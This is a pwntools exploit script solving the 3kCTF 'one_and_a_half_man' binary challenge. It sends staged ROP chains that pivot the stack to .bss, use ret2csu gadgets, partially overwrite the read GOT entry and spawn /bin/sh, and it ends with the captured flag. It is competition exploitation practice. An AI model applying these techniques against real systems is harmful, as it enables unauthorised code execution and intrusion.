from pwn import *

elf = ELF('./one_and_a_half_man')
context.binary = elf

HOST = 'one-and-a-half-man.3k.ctf.to'
PORT = 8521

io = remote(HOST, PORT)

bss = 0x601068
leave_r = 0x004005db  #: leave ; ret ;
pop_rdi = 0x00400693  #: pop rdi ; ret  ;
pop_rsi = 0x00400691  #: pop rsi ; pop r15 ; ret  ;
mov_r14 = 0x00400670
add_rbp = 0x00401108
pop_r45 = 0x00400690  #: pop r14 ; pop r15 ; ret  ;
csu = 0x040068A
init = 0x600e38
ret = 0x0040062d

rop1 = flat([
    b'A' * 10, bss,
    pop_rsi, bss + 8, 0x0,
    elf.sym.read, leave_r
])
io.send(rop1)
sleep(1)
rop2 = flat([
    csu, 0x0, 0x1, init, 0x0, 0x0, 0x1000, mov_r14, 0x0, 0x0, bss, 0x0, 0x0, 0x0, 0x0,
    pop_rsi, bss + 0x98, 0,
    elf.sym.read, leave_r
])

io.send(rop2)

r2 = flat([
    b'/bin/sh\x00',
    pop_rsi, elf.got['read'], 0x0,
    elf.sym.read,
    csu, 0x0, 0x1, init, 0x0, 0x0, (bss + 0x300), mov_r14, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
    pop_rsi, (bss + 0x300), 0x0,
    elf.sym.read,
    pop_rdi, bss + 0x98,
    pop_rsi, (bss + 0x308), 0x0,
    elf.sym.read
])
sleep(1)
io.send(r2)
sleep(1)
io.send('\x8f')
sleep(1)
io.send(p64(0x0) + p64(bss + 0x310) + b'\x00' * 43)
io.interactive()

# FLAG --> 3k{one_byte_and_a_half_overwrite_ftw!}
